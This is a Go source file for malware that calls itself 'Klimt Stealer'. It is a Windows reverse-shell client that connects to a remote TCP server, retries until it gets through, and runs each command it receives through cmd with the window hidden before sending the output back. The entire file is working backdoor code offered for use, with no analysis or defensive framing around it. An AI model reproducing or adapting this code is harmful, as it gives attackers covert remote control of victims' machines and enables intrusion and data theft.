package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
)

type Server struct {
	Host string
	Port string
}

type ClientSocket struct {
	Server Server
	Conn   net.Conn
}

func ExecuteShellCommand(command string) ([]byte, error) {
	// Execute system command using cmd argument and return output
	// Powershell commands not supported
	cmd := exec.Command("cmd", "/C", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()

	return output, err
}

func Connect(server Server) *ClientSocket {
	// Connect to the supplied TCP server (Server)
	addr := server.Host + ":" + server.Port
	for {
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			if conn != nil {
				conn.Close()
			}
			time.Sleep(CONTIMEOUT)
			continue
		}

		// Return a new ClientSocket instance containing the established TCP connection
		return &ClientSocket{
			Server: server,
			Conn:   conn,
		}
	}
}

func (client *ClientSocket) Listen() {
	// Listen for, execute and send the output of commands sent from the server
	client.Conn.Write([]byte("New Klimt Stealer Client Connected! \n"))

	for {
		// Listen for incoming commands from the server
		buffReader := bufio.NewReader(client.Conn)

		command, err := buffReader.ReadString('\n')
		if err != nil {
			client.Conn.Close()
			time.Sleep(CMDTIMEOUT)
			newClient := Connect(client.Server) // Re-establish connection
			client = newClient                  // Update client to use the new connection
			continue                            // Start loop again with the new connection
		}

		output, err := ExecuteShellCommand(command)
		if err != nil {
			continue
		}

		client.Conn.Write(output)
	}
}

func NewUPX() {
	// Use UPX for TCP Connection Setup
	// Not implemented in this version!
}

var (
	CMDTIMEOUT = time.Second * 3
	CONTIMEOUT = time.Second * 5
)
